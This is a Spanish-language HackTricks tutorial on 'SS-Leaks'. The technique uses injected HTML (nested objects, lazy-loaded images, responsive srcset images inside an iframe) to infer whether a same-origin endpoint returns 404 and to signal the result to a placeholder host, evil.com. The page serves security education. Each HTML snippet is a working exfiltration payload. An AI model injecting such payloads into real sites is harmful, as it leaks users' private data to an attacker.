# SS-Leaks

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esta es una **combinación** entre **dangling markup y XS-Leaks**. Por un lado, la vulnerabilidad permite **inyectar HTML** (pero no JS) en una página de la **misma origen** que la que atacaremos. Por otro lado, no atacaremos directamente la página donde podemos inyectar HTML, sino **otra página**.

## Objetos Anidados

Si el punto de conexión <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> devuelve un código de estado 404, entonces se carga el `object` interno, dando una devolución de llamada a <mark style="color:yellow;">`https://evil.com?callback=a`</mark> y permitiéndonos saber que la consulta de búsqueda `a` no arrojó resultados.
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### Carga perezosa

¿Qué pasa si CSP bloquea objetos externos? Intentémoslo de nuevo con el siguiente CSP:

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

Nuestro callback `object` de arriba ya no funciona. En su lugar, podemos usar la [carga perezosa](https://developer.mozilla.org/es/docs/Web/Performance/Lazy_loading) de imágenes. La siguiente imagen solo se cargará cuando sea visible y esté a una cierta distancia del viewport.
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### Imágenes responsivas

La técnica anterior es genial, pero depende de que nuestra inyección de HTML esté dentro del campo de visión del usuario.

Si la inyección está fuera de la pantalla y el usuario no se desplaza, ¿aún podemos filtrar datos? Por supuesto, podemos usar IDs de elementos y [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) para crear una URL que fuerce un desplazamiento, pero esto depende de la interacción del usuario y no nos permite lograr filtraciones consistentes en un escenario del mundo real. Idealmente, queremos aprovechar la inyección de HTML almacenada de manera confiable.

¡Aquí es donde entran en juego las imágenes responsivas! Específicamente, los atributos `srcset` y `sizes` de las imágenes.

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

Aquí hay varias cosas que debemos analizar. Primero, recuerda que el iframe interno solo será visible si el punto final con fugas devuelve un código de estado 404.

Esto es importante porque ahora vamos a cargar condicionalmente la imagen dentro del iframe desde dos URL diferentes. Usando el atributo `sizes`, podemos utilizar [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS\_media\_queries/Using\_media\_queries) para elegir desde qué URL cargar la imagen, dependiendo del tamaño de la ventana gráfica.

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

Porque nuestro iframe tiene `width="1000px"`, ocurre lo siguiente:

1. Si el punto final con fugas devuelve un código de estado 404, se muestra el iframe y tiene un ancho de 1000px. La imagen dentro del iframe coincide con la consulta de medios `(min-width: 1000px)` y carga la imagen de 800px desde `https://evil.com?callback=0`.
2. Si el punto final con fugas devuelve un código de estado 200, no se muestra el iframe. Dado que la imagen no se está representando como parte de un iframe grande, coincide con la consulta de medios `(max-width 999px)` y carga la imagen de 480px desde `https://evil.com?callback=1`.

## Referencias

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
